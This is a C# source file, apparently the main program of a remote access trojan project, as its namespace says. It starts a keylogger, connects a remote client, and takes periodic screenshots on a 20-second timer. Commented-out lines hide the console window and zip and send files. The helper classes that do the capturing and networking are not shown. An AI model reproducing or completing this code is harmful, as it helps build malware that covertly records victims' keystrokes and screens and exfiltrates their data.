using System;
using System.Timers;
using System.Windows.Forms;

namespace remote_access_trojan
{
    class Program
    {
        const int SW_HIDE = 0;
        static System.Timers.Timer timer;
        static int timerCount = 1;

        static void Main(string[] args)
        {
            // Hide the window on open
            //var handle = GetConsoleWindow();
            //ShowWindow(handle, SW_HIDE);

            Console.WriteLine("Hello World!");
            //Client.ExecuteClient();

            SetTimer();
            Keylogger.Run();
           // Client.ZipFiles();
            Client.newClient();

            // Do not move - this needs to be the last line
            Application.Run();
        }

        private static void SetTimer()
        {
            // Create a timer with a 20 second interval.
            timer = new System.Timers.Timer(20000);

            timer.Elapsed += OnTimerTick;
            timer.AutoReset = true;
            timer.Enabled = true;
        }

        private static void OnTimerTick(Object source, ElapsedEventArgs e)
        {
            // 2 minutes is up
            if (timerCount >= 10)
            {
                // Client.SendFile()
                timer.Stop();
                return;
            }

            Screenshot.takeScreenshot(timerCount);
            Console.WriteLine("Timer Tick: " + timerCount);

            timerCount++;
        }

    }
}
